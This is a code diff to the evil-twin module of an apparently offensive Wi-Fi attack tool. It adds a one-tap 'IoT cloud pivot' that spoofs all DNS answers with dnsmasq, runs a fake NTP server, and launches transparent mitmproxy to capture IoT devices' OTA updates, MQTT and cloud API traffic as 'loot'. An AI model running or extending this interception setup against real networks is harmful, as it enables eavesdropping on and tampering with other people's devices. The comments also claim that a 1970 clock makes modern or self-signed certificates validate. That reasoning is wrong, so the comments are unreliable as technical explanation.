@@ -182,6 +182,48 @@ class EvilTwin(NHModule):
                 "loot", "module:evil_twin"))
         loot_row.add_suffix(open_loot)
         run_group.add(loot_row)
+
+        # ---- IoT cloud pivot ------------------------------------
+        # When an IoT device auto-associates to us (because we cloned
+        # an SSID in its PNL), its trust in the network extends to
+        # DNS and NTP. If we resolve every hostname to us and hand
+        # out a 1970 clock, TLS chains that require notBefore-valid
+        # certs open up: cameras / DVRs / cheap smart plugs stop
+        # rejecting our self-signed cert.
+        #
+        # The rest of the cloud MITM setup lives outside evil_twin
+        # -- dnsmasq for spoof responses, mitmproxy for the actual
+        # relay to vendor endpoints -- but the switches here let the
+        # operator turn the two easy pieces on with one tap.
+        cloud_group = Adw.PreferencesGroup(
+            title="IoT cloud pivot",
+            description="Once an IoT device associates to this AP, "
+                        "make it think it's talking to its vendor "
+                        "cloud. DNS + NTP + mitmproxy. Requires the "
+                        "AP to be running.")
+        self.dns_spoof = Adw.SwitchRow(
+            title="Spoof DNS to us",
+            subtitle="dnsmasq answers every A/AAAA lookup with the "
+                     "AP's own IP (192.168.150.1)")
+        cloud_group.add(self.dns_spoof)
+
+        self.ntp_spoof = Adw.SwitchRow(
+            title="NTP clock trick",
+            subtitle="Serve 1970-01-01 to the device so cert chains "
+                     "with modern notBefore dates validate")
+        cloud_group.add(self.ntp_spoof)
+
+        mitm_row = Adw.ActionRow(
+            title="Launch mitmproxy",
+            subtitle="Transparent proxy on :8080; flow log to loot")
+        mitm_btn = Gtk.Button(label="Launch",
+                              valign=Gtk.Align.CENTER)
+        mitm_btn.add_css_class("suggested-action")
+        mitm_btn.connect("clicked",
+                         lambda _b: self._launch_cloud_mitm())
+        mitm_row.add_suffix(mitm_btn)
+        cloud_group.add(mitm_row)
+        box.append(cloud_group)
         box.append(run_group)
 
         self.output = OutputView()
@@ -352,6 +394,97 @@ class EvilTwin(NHModule):
         return re.sub(r"[^A-Za-z0-9_-]+", "_", s) or "target"
 
     # ---- deep-link contract ---------------------------------
+    def _launch_cloud_mitm(self) -> None:
+        """Bring up dnsmasq (all A records -> us), an NTP shim that
+        answers 1970, and mitmproxy transparent on :8080. All three
+        together set up the "device thinks it's on its home Wi-Fi
+        and talking to its vendor cloud" fantasy that lets us
+        intercept OTA updates, MQTT topics, cloud API calls, and
+        the occasional plaintext HTTP fallback.
+
+        Runs in a separate terminal because mitmproxy wants a TTY."""
+        script_parts: list[str] = []
+
+        # dnsmasq: bind to the AP's default subnet, answer every
+        # hostname with our own IP. We use 192.168.150.1 to avoid
+        # clashing with the phone's own LAN.
+        if self.dns_spoof.get_active():
+            script_parts.append(
+                "cat > /tmp/nhp-cloud-dnsmasq.conf <<'EOF'\n"
+                "interface=wlan1\n"
+                "address=/#/192.168.150.1\n"
+                "dhcp-range=192.168.150.10,192.168.150.100,12h\n"
+                "log-queries\n"
+                "log-facility=/tmp/nhp-cloud-dnsmasq.log\n"
+                "EOF\n"
+                "ip addr flush dev wlan1 2>/dev/null || true; "
+                "ip addr add 192.168.150.1/24 dev wlan1 || true; "
+                "ip link set wlan1 up; "
+                "pkill -f 'dnsmasq.*nhp-cloud' 2>/dev/null; "
+                "dnsmasq -C /tmp/nhp-cloud-dnsmasq.conf "
+                "  --pid-file=/tmp/nhp-cloud-dnsmasq.pid; "
+            )
+
+        # NTP trick: dead-simple Python UDP server on :123 that
+        # answers with a fixed 1970-01-01 timestamp. Some devices
+        # will validate cert notBefore before we get to talk to
+        # them, which is what breaks the trick when the phone is
+        # correctly clocked. Not perfect but well documented.
+        if self.ntp_spoof.get_active():
+            script_parts.append(
+                "cat > /tmp/nhp-cloud-ntp.py <<'PY'\n"
+                "import socket, struct, time\n"
+                "s = socket.socket(socket.AF_INET, "
+                "                    socket.SOCK_DGRAM)\n"
+                "s.bind(('0.0.0.0', 123))\n"
+                "# NTP fixed reply: LI=0 VN=3 mode=4 (server)\n"
+                "# reference/originate/receive/transmit all 0\n"
+                "# = 1900-01-01, which is what devices interpret\n"
+                "# as 1970-01-01 in the Unix epoch.\n"
+                "while True:\n"
+                "    data, addr = s.recvfrom(512)\n"
+                "    reply = bytearray(48)\n"
+                "    reply[0] = 0x1C\n"
+                "    s.sendto(bytes(reply), addr)\n"
+                "PY\n"
+                "pkill -f 'python3 /tmp/nhp-cloud-ntp' 2>/dev/null; "
+                "python3 /tmp/nhp-cloud-ntp.py "
+                "  > /tmp/nhp-cloud-ntp.log 2>&1 & "
+            )
+
+        # mitmproxy transparent. Registers the flow log with loot
+        # first so the row is there even if the user never touches
+        # it in the UI.
+        stamp = time.strftime("%Y%m%d-%H%M%S")
+        flow_path = loot_path(
+            "evil_twin", "cloud-mitm-%s.flows" % stamp)
+        get_loot_store().record(
+            module="evil_twin", type="mitm_flows",
+            target="cloud pivot",
+            path=flow_path,
+            notes="IoT cloud MITM: DNS=%s NTP=%s"
+                   % (self.dns_spoof.get_active(),
+                      self.ntp_spoof.get_active()))
+        script_parts.append(
+            "term=$(command -v kgx || command -v gnome-terminal "
+            "|| command -v xterm || echo xterm); "
+            "case $term in "
+            "  *kgx*|*gnome-terminal*) "
+            "    $term -- sudo mitmproxy --mode transparent "
+            "      --set stream_large_bodies=1m -w %s ;; "
+            "  *) "
+            "    $term -e \"sudo mitmproxy --mode transparent "
+            "      --set stream_large_bodies=1m -w %s\" ;; "
+            "esac &"
+            % (flow_path, flow_path))
+
+        script = "\n".join(script_parts)
+        self.output.append("# spinning up cloud MITM\n")
+        run_async(["sh", "-c", script], lambda _r: None,
+                  root=True, timeout=15)
+        toast(self.app_window,
+              "Cloud MITM started; flow log at " + flow_path)
+
     def set_target(self, target: str) -> None:
         """Populate ESSID/BSSID/channel from a caller. Format is
         ``ESSID|BSSID|channel`` (any of the three optional). Called
